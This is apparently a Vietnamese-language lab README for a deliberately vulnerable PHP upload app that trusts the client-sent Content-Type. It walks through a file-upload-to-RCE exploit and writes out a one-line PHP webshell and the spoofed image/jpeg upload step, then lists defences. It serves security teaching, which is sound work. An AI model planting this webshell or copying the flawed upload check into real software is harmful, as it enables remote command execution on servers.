# Lab 7.2 - File Upload dan toi RCE

App PHP cho upload "anh dai dien". Loi: chi kiem Content-Type do client gui (tin duoc), khong kiem duoi file / noi dung, luu nguyen ten vao thu muc web chay PHP duoc. Ket qua: upload webshell `.php` roi goi chay lenh.

## Dung

```bash
php -S 127.0.0.1:8062 -t www
```

Yeu cau: PHP 8.1 (co san CLI). Chi chay loopback.

## Endpoint

- `GET /`  form upload.
- `POST /upload.php`  nhan file, chi check `strpos($_FILES['file']['type'], 'image/') === 0`.
- `GET /uploads/<ten>`  truy cap file da tai (PHP o day se duoc thuc thi).

## Khai thac

```bash
bash exploit.sh
# neu mount Windows (drvfs) bao "Invalid argument": cat exploit.sh | bash
```

Buoc: tao `shell.php` = `<?php system($_GET["cmd"]); ?>`, upload voi Content-Type that (bi chan), roi upload lai gia `image/jpeg` (qua), cuoi cung goi `/uploads/shell.php?cmd=id`.

## Ket qua mong doi

Lenh `id` chay that tren server, tra ve `uid=... gid=...`. Xem `transcript.txt`.

## Vi sao dinh

`$_FILES['file']['type']` la Content-Type trong multipart do client dat, khong phai server tu suy ra. curl cho phep ep gia tri nay (`;type=image/jpeg`). Server tin no nen cho qua, roi luu `shell.php` vao thu muc PHP chay duoc.

## Phong

- Khong tin Content-Type client. Kiem duoi file bang allowlist (chi `.jpg/.png/...`), kiem bang `finfo`/`getimagesize` server-side.
- Doi ten file ngau nhien, bo duoi nguy hiem, khong giu ten goc.
- Luu file ngoai webroot hoac trong thu muc cam thuc thi (web server khong map PHP handler, hoac `Options -ExecCGI`, chan `.php/.phtml/.htaccess`).
- Khong cho thu muc upload chay script.
